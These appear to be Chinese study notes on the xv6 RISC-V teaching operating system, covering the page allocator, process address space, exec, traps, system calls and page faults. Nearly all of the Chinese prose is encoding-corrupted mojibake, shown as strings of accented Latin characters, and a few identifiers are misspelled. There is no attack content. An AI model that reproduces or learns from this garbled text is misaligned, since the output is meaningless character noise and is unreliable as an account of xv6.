ç»“æ„ä½“ä¸­ kernel/kalloc.c1234struct { struct spinlock lock; struct run *freelist;} kmem; xv6 åº”è¯¥é€šè¿‡è§£æç¡¬ä»¶çš„é…ç½®ä¿¡æ¯æ¥å†³å®šæœ‰å¤šå°‘ç‰©ç†å†…å­˜å¯ç”¨ main å‡½æ•°è°ƒç”¨ kinit æ¥åˆå§‹åŒ–åˆ†é…å™¨ kinit åˆå§‹åŒ– free é“¾è¡¨æ¥ä¿å­˜ free memory çš„æ¯ä¸€é¡µï¼ˆkernel æœ«å°¾ä¸ PHSYTOP ä¹‹é—´çš„å†…å­˜ç©ºé—´ï¼‰ kinit è°ƒç”¨ freerange æ¥å¯¹æ¯ä¸€é¡µè°ƒç”¨ kfree å‘ free é“¾è¡¨æ·»åŠ å†…å­˜ freerange ä½¿ç”¨ PGROUNDUP ç¡®ä¿ç‰©ç†åœ°å€å¯¹é½ï¼ˆç±»ä¼¼å‘ä¸Šå–æ•´ï¼‰ kfree ä¼šå°†é‡Šæ”¾çš„é¡µé¢æ‰€æœ‰å€¼è®¾ä¸º 1ï¼Œç„¶åä½¿ç”¨å¤´æ’æ³•å°†é¡µé¢é¦–åœ°å€åŠ å…¥ free é“¾è¡¨ è¿›ç¨‹åœ°å€ç©ºé—´æ¯ä¸ªè¿›ç¨‹æœ‰ä¸€ä¸ªå•ç‹¬çš„é¡µè¡¨ Address section Permission MAXVA trapline RXâ€“ trapframe R-W- unused heap R-WU stack R-WU guard page data R-WU Page aligned unused 0 text R-XU trampoline å’Œ trapframe æ˜ å°„åœ¨é«˜åœ°å€ï¼Œç”¨æˆ·æ¨¡å¼ä¸å¯è®¿é—® trampolineï¼šåœ¨è°ƒç”¨ ecall æ—¶ä¼šè·³è½¬åˆ°è¿™é‡Œ trapframeï¼šåœ¨è°ƒç”¨ ecall æ—¶ï¼Œç”¨æˆ·è¿›ç¨‹çš„é€šç”¨å¯„å­˜å™¨ä¼šä¿å­˜åœ¨è¿™é‡Œ ä»£ç ï¼šsbrkç³»ç»Ÿè°ƒç”¨ sbrk ç”¨äºè¿›ç¨‹å¢å‡å†…å­˜å¤§å°ï¼Œç”± growproc å®ç° growproc æ ¹æ® n çš„æ­£è´Ÿï¼Œè°ƒç”¨ uvmalloc æˆ– uvmdealloc uvmalloc è°ƒç”¨ kalloc åˆ†é…ç‰©ç†å†…å­˜ï¼Œç„¶åè°ƒç”¨ mappages å‘ç”¨æˆ·é¡µè¡¨æ·»åŠ  PTE uvmdealloc è°ƒç”¨ uvmunmapï¼Œuvmunmap ä½¿ç”¨ walk æ‰¾åˆ°å¯¹åº”çš„ PTE å’Œ kfree é‡Šæ”¾ç‰©ç†å†…å­˜ ä»£ç ï¼šexecexec ä½¿ç”¨ namei æ‰“å¼€äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç„¶åè¯»å– ELF å¤´ ä¸€ä¸ª ELF æ–‡ä»¶åŒ…å«ä¸€ä¸ª ELF å¤´ï¼ˆstruct elfhdrï¼‰ï¼Œä¸€ç³»åˆ—ç¨‹åº section å¤´ï¼ˆstruct proghdrï¼‰ï¼Œæ¯ä¸ª struct proghdr æè¿°äº†ç¨‹åºå¿…é¡»åŠ è½½åˆ°å†…å­˜ä¸­çš„ sectionï¼Œxv6 ç¨‹åºæœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªæŒ‡ä»¤ï¼Œä¸€ä¸ªæ˜¯æ•°æ® ç¬¬ä¸€æ­¥æ˜¯æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æ˜¯ ELF æ–‡ä»¶ï¼Œå®ƒä» 4 å­—èŠ‚çš„é­”æœ¯æ•°å­—å¼€å§‹ï¼ˆ0x7Fï¼Œâ€™Eâ€™ï¼Œâ€™Lâ€™ï¼Œâ€™Fâ€™ï¼Œæˆ–è€… ELF_MAGICï¼‰ ä½¿ç”¨ proc_pagetable åˆ†é…ä¸€ä¸ªæ²¡æœ‰ç”¨æˆ·æ˜ å°„çš„æ–°é¡µè¡¨ï¼Œç”¨ uvmalloc ç»™æ¯ä¸ª ELF æ®µåˆ†é…å†…å­˜ï¼Œç”¨ loadseg åŠ è½½æ¯ä¸ªæ®µåˆ°å†…å­˜ä¸­ï¼Œloadseg ä½¿ç”¨ walkaddr æ‰¾åˆ°ç‰©ç†åœ°å€å†™å…¥æ¯ä¸ªæ®µã€‚ä½¿ç”¨ readi è¯»å–æ¯ä¸ªæ®µ åˆ†é…å¹¶åˆå§‹åŒ–ä¸€é¡µç”¨æˆ·æ ˆï¼Œå°†å‚æ•°å­—ç¬¦ä¸²å¤åˆ¶åˆ°æ ˆé¡¶ï¼Œåœ¨ ustack è®°å½•å­—ç¬¦ä¸²æŒ‡é’ˆï¼Œustack å‰ä¸‰ä¸ªæ˜¯ fake è¿”å›ç¨‹åºè®¡æ•°å™¨ï¼Œargc å’Œ argv exec ä¼šåœ¨æ ˆé¡µçš„ä¸‹é¢æ”¾ä¸€ä¸ªä¸å¯è®¿é—®çš„é¡µ åœ¨å‡†å¤‡æ–°çš„å†…å­˜é•œåƒæ—¶ï¼Œå¦‚æœæ£€æµ‹åˆ°ä¸€ä¸ªé”™è¯¯ï¼ˆå¦‚æ— æ•ˆçš„ç¨‹åºæ®µï¼‰ï¼Œä¼šè·³è½¬åˆ° bad æ ‡ç­¾ï¼Œé‡Šæ”¾æ–°çš„é•œåƒï¼Œè¿”å› -1ã€‚ä¸€æ—¦é•œåƒå®Œæˆï¼Œexec æäº¤æ–°çš„é¡µè¡¨ï¼Œé‡Šæ”¾æ—§çš„ exec ä»æ–‡ä»¶æŒ‡å®šçš„åœ°å€å°†æ•°æ®åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œå› æ­¤ exec æ˜¯æœ‰é£é™©çš„ï¼Œéœ€è¦æ‰§è¡Œå¾ˆå¤šæ£€æŸ¥ Real worldçœŸæ­£çš„å†…å­˜åˆ†é…å™¨éœ€è¦å¤„ç†å°åˆ†é…å’Œå¤§åˆ†é… Chapter 4 Traps and system callstrapï¼ˆé™·é˜±ï¼‰æ˜¯è®©CPU æç½®æ™®é€šæŒ‡ä»¤çš„æ‰§è¡Œï¼Œå¹¶å°†æ§åˆ¶æƒè½¬ç§»åˆ°å¤„ç†è¯¥äº‹ä»¶çš„ç‰¹æ®Šä»£ç  ç³»ç»Ÿè°ƒç”¨ å¼‚å¸¸ é™¤ä»¥ 0 æˆ–ä½¿ç”¨æ— æ•ˆçš„è™šæ‹Ÿåœ°å€ç­‰ ä¸­æ–­ è®¾å¤‡å‘å‡ºä¿¡å·ï¼Œå¦‚ç£ç›˜å®Œæˆè¯»å†™è¯·æ±‚æ—¶ é€šå¸¸ï¼Œtrap å‘ç”Ÿæ—¶æ‰§è¡Œçš„ä»£ç ä¸ä¹…åéƒ½éœ€è¦æ¢å¤ï¼Œä»£ç å¹¶ä¸éœ€è¦æ„è¯†åˆ°å‘ç”Ÿäº†ä»»ä½•ç‰¹æ®Šæƒ…å†µ å¼‚å¸¸å¤„ç† trap å¼ºåˆ¶å°†æ§åˆ¶æƒè½¬ç§»ç»™å†…æ ¸ å†…æ ¸ä¿å­˜å¯„å­˜å™¨å’Œå…¶ä»–çŠ¶æ€ å†…æ ¸æ‰§è¡Œå¤„ç†ä»£ç  å†…æ ¸æ¢å¤ä¿å­˜çš„å¯„å­˜å™¨å’ŒçŠ¶æ€å¹¶ä»é™·é˜±ä¸­è¿”å› åŸå§‹ä»£ç ä»å®ƒåœæ­¢çš„åœ°æ–¹æ¢å¤ Xv6 åœ¨å†…æ ¸ä¸­å¤„ç†æ‰€æœ‰ trapï¼Œtrap ä¸ä¼šä¼ é€’ç»™ç”¨æˆ·ä»£ç  éš”ç¦»è¦æ±‚åªæœ‰å†…æ ¸å¯ä»¥ä½¿ç”¨ç¡¬ä»¶è®¾å¤‡ï¼Œä¸”å†…æ ¸æ˜¯ä¸€ç§æ–¹ä¾¿çš„æœºåˆ¶ï¼Œå¯ä»¥åœ¨å¤šä¸ªè¿›ç¨‹ä¹‹é—´å…±äº«è®¾å¤‡ï¼Œä¸äº’ç›¸å¹²æ‰°ï¼Œè¿™å¯¹äºå¼‚å¸¸ä¹Ÿæœ‰æ„ä¹‰ï¼Œxv6 é€šè¿‡æ€æ­»è¿è§„ç¨‹åºæ¥å¤„ç†ç”¨æˆ·ç©ºé—´çš„æ‰€æœ‰å¼‚å¸¸ Xv6 å¤„ç† trap æœ‰å››ä¸ªé˜¶æ®µ RISC-V CPU è¿›è¡Œç¡¬ä»¶æ“ä½œ ä¸€äº›ä¸ºå†…æ ¸ C ä»£ç åšå¥½å‡†å¤‡çš„æ±‡ç¼–æŒ‡ä»¤ å†³å®šå¦‚ä½•å¤„ç† trap çš„ C å‡½æ•° ç³»ç»Ÿè°ƒç”¨æˆ–è®¾å¤‡é©±åŠ¨ç¨‹åºæœåŠ¡ä¾‹ç¨‹ å¤„ç† trap çš„ä»£ç ï¼ˆæ±‡ç¼–æˆ– Cï¼‰è¢«ç§°ä¸º handler handler çš„ç¬¬ä¸€æ­¥é€šå¸¸ç”¨æ±‡ç¼–è¯­è¨€ç¼–å†™ï¼Œç§°ä¸º vector RISC-V trap æœºåˆ¶å¯„å­˜å™¨æ§åˆ¶å¯„å­˜å™¨ï¼šå†…æ ¸å¯è¯»å†™ï¼Œç”¨äºå‘Šè¯‰ CPU æ€ä¹ˆå¤„ç† trap stvecï¼šä¿å­˜å†…æ ¸å¤„ç† trap çš„åœ°å€ï¼Œå‘ç”Ÿ trap æ—¶ä¼šè·³è½¬åˆ°è¯¥åœ°å€ Supervisor Trap Vector ç”¨æˆ·æ¨¡å¼ä¸‹ä¼šæŒ‡å‘å†…æ ¸ä»£ç çš„ usertrap å†…æ ¸æ¨¡å¼ä¸‹ä¼šæŒ‡å‘å†…æ ¸ä»£ç çš„ kerneltrap sepcï¼šå‘ç”Ÿ trap æ—¶ä¿å­˜å½“å‰çš„ pcï¼Œåœ¨ä½¿ç”¨ sret æŒ‡ä»¤æ—¶ï¼Œä¼šè·³è½¬åˆ° sepc æŒ‡å‘çš„åœ°å€ Supervisor Exception Program Counter sretï¼šä» trap è¿”å› å†…æ ¸å¯æ§åˆ¶ sepc è®© sret è¿”å›åˆ°é€‚å½“çš„ä½ç½® scauseï¼šæè¿° trap ç±»å‹ Supervisor Trap Cause 8 è¡¨ç¤ºç³»ç»Ÿè°ƒç”¨ å…¶ä»–è¡¨ç¤ºé”™è¯¯æˆ–è€…ä¸­æ–­ sscatchï¼šè¾…åŠ©ä½œç”¨ï¼Œé˜²æ­¢åœ¨ä¿å­˜ç”¨æˆ·å¯„å­˜å™¨å‰å°†å…¶è¦†ç›– ä¸€èˆ¬ç”¨æ¥ä¿å­˜ a0 åœ¨ xv6 çš„ 2020 ç‰ˆæœ¬ç”¨æ¥ä¿å­˜ trapframe åœ°å€ sstatusï¼šä»¥ bitmap å½¢å¼ä¿å­˜ä¸€äº›æ§åˆ¶ä¿¡æ¯ Supervisor Status SPPï¼šè¡¨ç¤º trap æ¥è‡ªç”¨æˆ·æ¨¡å¼ï¼ˆ0ï¼‰è¿˜æ˜¯ç®¡ç†è€…æ¨¡å¼ï¼ˆ1ï¼‰ï¼Œå¹¶ä¸”ç”¨æ¥å‘Šè¯‰ sret è¿”å›åˆ°å“ªä¸ªæ¨¡å¼ SIEï¼šè¡¨ç¤ºæ˜¯å¦å…è®¸è®¾å¤‡ä¸­æ–­ï¼Œè‹¥ä¸º 0 åˆ™ RISC-V ä¼šæ¨è¿Ÿè®¾å¤‡ä¸­æ–­ åœ¨æœºå™¨æ¨¡å¼ä¸‹æœ‰ä¸€ç»„ç±»ä¼¼çš„æ§åˆ¶å¯„å­˜å™¨ï¼Œxv6 åªåœ¨å®šæ—¶å™¨ä¸­æ–­çš„æƒ…å†µä¸‹ä½¿ç”¨ å¤„ç† trap å‰ä¸‹é¢æ˜¯é™¤ å®šæ—¶å™¨ä¸­æ–­ å¤–çš„ trap å°† sstatus çš„ SIE ä½ ç½®é›¶ å¦‚æœæ˜¯è®¾å¤‡ä¸­æ–­ï¼Œä¸ä¼šç»§ç»­ä¸‹é¢çš„æ“ä½œ å°† pc å¤åˆ¶ç»™ sepc ä¿å­˜å½“å‰æ¨¡å¼åˆ° sstatus çš„ SSP è®¾ç½® scause è¡¨ç¤º trap åŸå›  è®¾ç½®ä¸ºç®¡ç†è€…æ¨¡å¼ å°† stvec å¤åˆ¶ç»™ pc å¼€å§‹æ‰§è¡Œæ–°çš„ pc æŒ‡å‘çš„æŒ‡ä»¤ æ³¨æ„ï¼šæ­¤æ—¶æ²¡æœ‰è½¬æ¢ä¸ºå†…æ ¸é¡µè¡¨ï¼Œæ²¡æœ‰è½¬æ¢ä¸ºå†…æ ¸æ ˆï¼Œä¹Ÿæ²¡æœ‰ä¿å­˜é™¤ pc å¤–çš„ä»»ä½•å¯„å­˜å™¨ï¼Œè¿™äº›éœ€è¦ç”±å†…æ ¸æ¥å®ç° åŸå› ï¼šè¿™æ ·èƒ½æä¾›ç»™å†…æ ¸æ›´å¥½çš„çµæ´»æ€§ï¼Œä¾‹å¦‚åœ¨å†…æ ¸ä¸­å‘ç”Ÿ trap å¹¶ä¸éœ€è¦è½¬æ¢é¡µè¡¨ï¼Œå¯ä»¥æé«˜å¤„ç† trap çš„æ€§èƒ½ ç›¸å…³çš„æ±‡ç¼–æŒ‡ä»¤ ecall environment call ç³»ç»Ÿè°ƒç”¨ï¼Œä¸€ç§ trap sret Supervisor Return å°†æ¨¡å¼ä»ç®¡ç†è€…æ¨¡å¼æ›´æ”¹ä¸ºæŒ‡å®šçš„æ¨¡å¼ï¼ˆsstatus çš„ SPP ä½ï¼‰ å°† sepc å¯„å­˜å™¨å¤åˆ¶ç»™ pc å¯„å­˜å™¨ å¯ç”¨è®¾å¤‡ä¸­æ–­ï¼ˆå°† sstatus çš„ SIE ä½è®¾ä¸º 1ï¼‰ csrw å†™å…¥æ§åˆ¶å¯„å­˜å™¨ csrw sscratch, a0 csrr è¯»å–æ§åˆ¶å¯„å­˜å™¨ csrr t0, sscratch ç”¨æˆ· trapæ¥è‡ªç”¨æˆ·ç©ºé—´çš„ trap çš„å¤„ç†æµç¨‹ uservecï¼ˆkernel/trampoline.Sï¼‰ usertrapï¼ˆkernel/trap.cï¼‰ usertrapretï¼ˆkernel/trap.cï¼‰ userretï¼ˆkernel/trapline.Sï¼‰ trampolineç”±äºRISC-V ç¡¬ä»¶åœ¨å‘ç”Ÿ trap æ—¶ä¸ä¼šè½¬æ¢é¡µè¡¨ï¼Œè¿™æ„å‘³ç€ stvec ä¿å­˜çš„åœ°å€ï¼ˆå¤„ç† trap çš„åœ°å€ï¼‰å¿…é¡»åœ¨ç”¨æˆ·é¡µè¡¨ä¸­å­˜åœ¨æœ‰æ•ˆæ˜ å°„ï¼Œå¹¶ä¸”åœ¨è½¬æ¢æˆå†…æ ¸é¡µè¡¨åï¼Œå¿…é¡»åœ¨å†…æ ¸é¡µè¡¨ä¸­ä¹Ÿå­˜åœ¨æœ‰æ•ˆæ˜ å°„ Xv6 ä½¿ç”¨äº†ä¸€ä¸ª trampoline é¡µè¡¨æ¥è§£å†³ä¸Šé¢çš„é™åˆ¶æ¡ä»¶ trampoline é¡µé¢åŒ…å« stvec æŒ‡å‘çš„ uservec ç¨‹åºå’Œç”¨äºè¿”å›åˆ°ç”¨æˆ·ä»£ç çš„ userret ç¨‹åº trampoline åœ¨å†…æ ¸æ¯ä¸ªè¿›ç¨‹çš„é¡µè¡¨ä¸­éƒ½æ˜ å°„åˆ°äº† TRAMPOLINEï¼ˆ0x3ffffff000ï¼‰åœ°å€ä¸Šï¼Œä½äºè™šæ‹Ÿåœ°å€é¡¶éƒ¨ï¼Œå®ƒåªå…è®¸ç®¡ç†è€…æ¨¡å¼æ‰§è¡Œ trapframeé€šç”¨å¯„å­˜å™¨å†…å®¹ä¼šä¿å­˜åˆ°ä¸€ä¸ª trapframe ç»“æ„ä½“ï¼Œå®ƒé€šå¸¸åœ¨ç”¨æˆ·é¡µè¡¨ä¸­æ˜ å°„åˆ°ä¸ trampoline ç›¸é‚»çš„ä½ç½®ï¼ˆ0x3fffffe000ï¼‰ï¼Œä¸”ä¹Ÿåªå…è®¸ç®¡ç†è€…æ¨¡å¼è®¿é—® å®ƒçš„ç‰©ç†åœ°å€ä¿å­˜åœ¨ proc ç»“æ„ä½“çš„ trapframe æˆå‘˜å˜é‡ä¸­ï¼Œä»¥ä¾¿å†…æ ¸èƒ½é€šè¿‡å†…æ ¸é¡µè¡¨ç›´æ¥è®¿é—®å®ƒ kernel/proc.h12345678struct trapframe { /* 0 */ uint64 kernel_satp; // kernel page table /* 8 */ uint64 kernel_sp; // top of process's kernel stack /* 16 */ uint64 kernel_trap; // usertrap() /* 24 */ uint64 epc; // saved user program counter /* 32 */ uint64 kernel_hartid; // saved kernel tp ...}; kernel_satp ä¿å­˜ kernel é¡µè¡¨åœ°å€ kernel_sp ä¿å­˜è¿›ç¨‹çš„å†…æ ¸æ ˆé¡¶åœ°å€ kernel_trap ä¿å­˜å†…æ ¸ä»£ç ä¸­çš„ usertrap ä½ç½® epc ä¿å­˜ç”¨æˆ·çš„ pc åœ¨ usertrap() ä¸­ä¼šå°† sepc å¯„å­˜å™¨å†…å®¹ä¿å­˜åˆ°è¿™é‡Œ å› ä¸ºå¯èƒ½ä¼šè·³è½¬åˆ°å¦ä¸€ä¸ªç”¨æˆ·è¿›ç¨‹å»æ‰§è¡Œï¼Œsepc å¯„å­˜å™¨å¯èƒ½ä¼šè¢«æ›´æ”¹ kernel_hartid CPU æ ¸å¿ƒ idï¼Œè¡¨ç¤ºè¯¥è¿›ç¨‹åœ¨å“ªä¸ª CPU æ ¸å¿ƒè¿è¡Œï¼Œä» 0 å¼€å§‹ å‰©ä¸‹çš„æ˜¯é€šç”¨å¯„å­˜å™¨ uservecuservec ä»£ç ä½äº kernel/trampoline.S ä¸­ å®ƒçš„ä½œç”¨æ˜¯ä¿å­˜ç”¨æˆ·ä»£ç çš„é€šç”¨å¯„å­˜å™¨ï¼Œåˆ‡æ¢å†…æ ¸æ ˆã€å†…æ ¸é¡µè¡¨ç­‰ï¼Œè·³è½¬åˆ°å†…æ ¸ä¸­å¤„ç† trap çš„ä½ç½® usertrapï¼ˆkernel/proc.cï¼‰ usertrapusertrap ä»£ç ä½äº kernel/trap.c ä¸­ å®ƒçš„ä½œç”¨æ˜¯ç¡®å®š trap çš„åŸå› ï¼Œå¤„ç†å®ƒå¹¶è¿”å› é¦–å…ˆå°† stvec æ›´æ”¹ä¸º kernelvecï¼ˆkernel/kenelvec.Sï¼‰ï¼Œè¿™æ ·åœ¨å†…æ ¸ä¸­å‘ç”Ÿ trap æ—¶ï¼Œä¼šè¿›å…¥ kerneltrap è¿›è¡Œå¤„ç†ï¼Œè€Œä¸ä¼šè¿›å…¥ usertrap å°† sepc ä¿å­˜åˆ° trapframe ä¸­ï¼Œå› ä¸º trap æœ‰å¯èƒ½æ—¶è®¡æ—¶å™¨ä¸­æ–­ï¼Œè½¬æ¢åˆ°å¦ä¸€ä¸ªè¿›ç¨‹å»æ‰§è¡Œï¼Œä¼šå°† sepc è¦†ç›– æ ¹æ® trap ç§ç±» ç³»ç»Ÿè°ƒç”¨ p-&gt;trapframe-&gt;epc +=4 è¿™æ ·åœ¨å›åˆ°ç”¨æˆ·è¿›ç¨‹æ—¶ï¼Œä¼šæ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œè€Œä¸æ˜¯å†æ‰§è¡Œ ecall å¯ç”¨è®¾å¤‡ä¸­æ–­ è°ƒç”¨ syscall æ¥æ‰§è¡Œå¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨ è®¾å¤‡ä¸­æ–­ è°ƒç”¨ devintr å¤„ç† å¼‚å¸¸ æ€æ­»å‡ºé”™çš„è¿›ç¨‹ æ£€æŸ¥è¿›ç¨‹æ˜¯å¦è¢«æ€æ­»ï¼Œè‹¥æ€æ­»åˆ™è°ƒç”¨ exit é€€å‡º æ£€æŸ¥æ˜¯å¦æ˜¯è®¡æ—¶å™¨ä¸­æ–­ï¼Œè‹¥æ˜¯åˆ™è°ƒç”¨ yield æ”¾å¼ƒ CPU usertrapretusertrapret ä»£ç ä½äº kernel/trap.c ä¸­ å®ƒçš„ä½œç”¨æ˜¯è®¾ç½® trapframe å’Œæ§åˆ¶å¯„å­˜å™¨ å°† stvec æ›´æ”¹ä¸º uservecï¼ˆkernel/trampoline.Sï¼‰ è®¾ç½® trapframe ä¸­ uservec éœ€è¦ä½¿ç”¨çš„å­—æ®µ è®¾ç½® sstatus è®¾ç½® sepc ä¸ºä¹‹å‰ä¿å­˜çš„ pc å°†ç”¨æˆ·é¡µè¡¨æ”¾å…¥ a0 ä¼ é€’ç»™ userret userretuserret ä»£ç ä½äº kernel/trampoline.S ä¸­ å®ƒçš„ä½œç”¨æ˜¯åˆ‡æ¢ä¸ºç”¨æˆ·é¡µè¡¨ï¼Œä» trapframe ä¸­æ¢å¤é€šç”¨å¯„å­˜å™¨ï¼Œè°ƒç”¨ sret è·³è½¬ sepc æŒ‡å‘çš„åœ°å€ï¼Œè¿”å›åˆ°ç”¨æˆ·æ¨¡å¼ ä»£ç ï¼šè°ƒç”¨ç³»ç»Ÿè°ƒç”¨user/initcode.S å°† exec çš„å‚æ•°æ”¾åœ¨ a0 å’Œ a1 å¯„å­˜å™¨ä¸­ï¼ŒæŠŠç³»ç»Ÿè°ƒç”¨å·æ”¾åœ¨ a7 ä¸­ ecall æŒ‡ä»¤è¿›å…¥å†…æ ¸ï¼Œæ‰§è¡Œ uservecã€usertrap å’Œ syscall æ‰§è¡Œ syscall åœ¨ trapframe ä¸­æ£€ç´¢ a7 ä¿å­˜çš„ç³»ç»Ÿè°ƒç”¨å·ï¼Œå¹¶ç”¨å®ƒç´¢å¼•åˆ° syscall ä¸­ å½“ syscall è¿”å›æ—¶ï¼Œå°†è¿”å›å€¼è®°å½•åˆ° p-&gt;trapframe-&gt;a0 ä¸­ ç„¶åç”¨æˆ·ç©ºé—´çš„ exec å‡½æ•°ä¼šå°†è¯¥å€¼è¿”å› ç³»ç»Ÿè°ƒç”¨å·æ— æ•ˆï¼Œä¼šæ‰“å°é”™è¯¯ç„¶åè¿”å› -1 ä»£ç ï¼šç³»ç»Ÿè°ƒç”¨å‚æ•°æ ¹æ® RISC-V C è°ƒç”¨çº¦å®šï¼Œç³»ç»Ÿè°ƒç”¨å‚æ•°å­˜æ”¾åœ¨å¯„å­˜å™¨ä¸­ å†…æ ¸é™·é˜±ä»£ç å°†å¯„å­˜å™¨çš„å€¼ä¿å­˜åˆ°å½“å‰è¿›ç¨‹çš„ trapframe ä¸­ï¼Œè¿™æ ·å†…æ ¸å¯ä»¥æ‰¾åˆ°å®ƒä»¬ å†…æ ¸å‡½æ•° argintï¼Œargaddrï¼Œargfd ä» trapframe ä¸­æ£€ç´¢ç³»ç»Ÿè°ƒç”¨å‚æ•°ä½œä¸ºæ•´æ•°ã€æŒ‡é’ˆæˆ–æ–‡ä»¶æè¿°ç¬¦ï¼Œå®ƒä»¬éƒ½è°ƒç”¨ argraw ä»ç”¨æˆ·å¯„å­˜å™¨ä¸­æ£€ç´¢ æŒ‡é’ˆä½œä¸ºå‚æ•°æœ‰ä¸¤ä¸ªæŒ‘æˆ˜ ç”¨æˆ·ç¨‹åºå¯èƒ½æ˜¯é”™è¯¯æˆ–æ¶æ„çš„ï¼Œä¼ é€’ä¸€ä¸ªæ— æ•ˆçš„æŒ‡é’ˆæˆ–æ¬ºéª—å†…æ ¸ç”¨æ¥è®¿é—®å†…æ ¸å†…å­˜çš„æŒ‡é’ˆ xv6 å†…æ ¸é¡µè¡¨æ˜ å°„ä¸ç”¨æˆ·é¡µè¡¨æ˜ å°„å¹¶ä¸ç›¸åŒï¼Œä¸èƒ½ç”¨æ™®é€šæŒ‡ä»¤ä»æä¾›çš„åœ°å€åŠ è½½æˆ–å­˜å‚¨æ•°æ® å†…æ ¸å®ç°äº†å®‰å…¨çš„ä¼ è¾“æ•°æ®çš„å‡½æ•° æ–‡ä»¶ç³»ç»Ÿè°ƒç”¨å¦‚ exec ç”¨ fetchstrï¼ˆkernel/syscall.cï¼‰ä»ç”¨æˆ·ç©ºé—´æ£€ç´¢å­—ç¬¦ä¸²æ–‡ä»¶åå‚æ•° fetchstr è°ƒç”¨ copyinstrï¼ˆkernel/vm.cï¼‰æ¥å®Œæˆ copyinstr ä»ç”¨æˆ·é¡µè¡¨çš„è™šæ‹Ÿåœ°å€ p-&gt;pagetable-&gt;srcva å¤åˆ¶ max å­—èŠ‚åˆ° dst ä¸­ å› ä¸º pagetable ä¸æ˜¯å½“å‰çš„é¡µè¡¨ï¼Œcopyinstr ä½¿ç”¨ walkaddrï¼ˆå®ƒä¼šè°ƒç”¨ walkï¼‰ åœ¨ pagetable ä¸­æŸ¥æ‰¾ srcvaï¼Œä»è€Œäº§ç”Ÿç‰©ç†åœ°å€ pa0 å†…æ ¸å°†æ¯ä¸ªç‰©ç†å†…å­˜åœ°å€æ˜ å°„åˆ°å¯¹åº”çš„å†…æ ¸è™šæ‹Ÿåœ°å€ï¼Œå› æ­¤ copyinstr èƒ½ç›´æ¥ä» pa0 å¤åˆ¶å­—ç¬¦ä¸²å­—èŠ‚åˆ° dst walkaddrï¼ˆkernel/vm.cï¼‰ä¼šæ£€æŸ¥ç”¨æˆ·æä¾›çš„è™šæ‹Ÿåœ°å€æ˜¯å¦æ˜¯è¿›ç¨‹åœ°å€ç©ºé—´çš„ä¸€éƒ¨åˆ†ï¼Œå› æ­¤ç¨‹åºä¸èƒ½æ¬ºéª—å†…æ ¸æ¥è¯»å–å…¶ä»–å†…å­˜ ç±»ä¼¼çš„åŠŸèƒ½ copyout ä»å†…æ ¸è¯»å–æ•°æ®åˆ°ç”¨æˆ·æä¾›çš„åœ°å€ å†…æ ¸ trapCPU åœ¨æ‰§è¡Œå†…æ ¸æ—¶ï¼Œstvec ä¼šæŒ‡å‘ kernelvecï¼ˆkernel/kernelvec.Sï¼‰ å¦‚æœå‘ç”Ÿ trap ä¼šè·³è½¬åˆ° kernelvec æ¥å¤„ç† trap kernelvec å°†é€šç”¨å¯„å­˜å™¨ä¿å­˜åœ¨ä¸­æ–­çš„å†…æ ¸çº¿ç¨‹çš„æ ˆä¸­ï¼Œtrap æœ‰å¯èƒ½å¯¼è‡´åˆ‡æ¢çº¿ç¨‹ï¼Œè¿™æ ·ä¸ä¼šå¯¼è‡´æ··ä¹± kernelvec ä¿å­˜å®Œå¯„å­˜å™¨åè°ƒç”¨ kerneltrapï¼ˆkernel/trap.cï¼‰ kerneltrap ä¼šä¿å­˜æ§åˆ¶å¯„å­˜å™¨å¹¶å¤„ç†ä¸¤ç§ trap è®¾å¤‡ä¸­æ–­ ä½¿ç”¨ devintr æ£€æŸ¥è®¾å¤‡ä¸­æ–­ å¦‚æœæ˜¯è®¡æ—¶å™¨ä¸­æ–­ï¼Œä¸”è¿›ç¨‹çš„å†…æ ¸çº¿ç¨‹æ­£åœ¨è¿è¡Œï¼Œkerneltrep ä¼šè°ƒç”¨ yield è®©å…¶ä»–çº¿ç¨‹æœ‰æœºä¼šè¿è¡Œ å¼‚å¸¸ å†…æ ¸ä¼šè°ƒç”¨ panic ç„¶ååœæ­¢è¿è¡Œ å½“ kerneltrap ä»»åŠ¡å®Œæˆåï¼Œå®ƒéœ€è¦è¿”å›åˆ° trap ä¸­æ–­çš„ä»£ç ï¼Œä¼šæ¢å¤ä¿å­˜çš„æ§åˆ¶å¯„å­˜å™¨ï¼Œç„¶åè¿”å›åˆ° kernelvec kernelvec æ¢å¤ä¿å­˜çš„é€šç”¨å¯„å­˜å™¨ï¼Œç„¶åæ‰§è¡Œ sretï¼Œè¿”å›ä¸­æ–­çš„å†…æ ¸ä»£ç  åœ¨å†…æ ¸å¼€å§‹æ‰§è¡Œæ—¶æœ‰ä¸€æ®µæ—¶é—´ stvec ä»ç„¶æŒ‡å‘ uservecï¼Œè¿™æ®µæ—¶é—´å†…ä¸å…è®¸å‘ç”Ÿè®¾å¤‡ä¸­æ–­ RISC-V ä¼šåœ¨å‘ç”Ÿ trap æ—¶å…³é—­è®¾å¤‡ä¸­æ–­ï¼Œè®©å†…æ ¸æœ‰æ—¶é—´è®¾ç½® stvec ä¸º kernelvec é¡µé¢é”™è¯¯å¼‚å¸¸CPU ä¼šå‘å‡ºé¡µé¢é”™è¯¯å¼‚å¸¸ï¼Œå½“ï¼š è™šæ‹Ÿåœ°å€åœ¨é¡µè¡¨ä¸­æ²¡æœ‰æ˜ å°„ PTE çš„ PTE_V æ ‡å¿—ä½ä¸º 0 PTE çš„æƒé™ä½é˜»æ­¢æ­£åœ¨å°è¯•çš„æ“ä½œ RISC-V åŒºåˆ†ä¸‰ç§é¡µé¢é”™è¯¯ï¼š load page faults store page faults instruction page faults PC å¯„å­˜å™¨çš„åœ°å€æŒ‡å‘çš„æŒ‡ä»¤æ— æ³•ç¿»è¯‘ xv6 çš„å¼‚å¸¸å¤„ç†å¾ˆå•ä¸€ï¼šå¦‚æœåœ¨ç”¨æˆ·ç©ºé—´å‘ç”Ÿå¼‚å¸¸ï¼Œå†…æ ¸ä¼šæ€æ­»å‡ºé”™çš„è¿›ç¨‹ï¼Œå¦‚æœåœ¨å†…æ ¸ä¸­å‘ç”Ÿå¼‚å¸¸ï¼Œå†…æ ¸ä¼šå‘ç”Ÿ panic çœŸå®çš„æ“ä½œç³»ç»Ÿä¼šåšå¾ˆå¤šæœ‰è¶£çš„å¤„ç† COW fork Lazy allocation Demand Paging Paging to disk Extending stacks Memory-mapped files 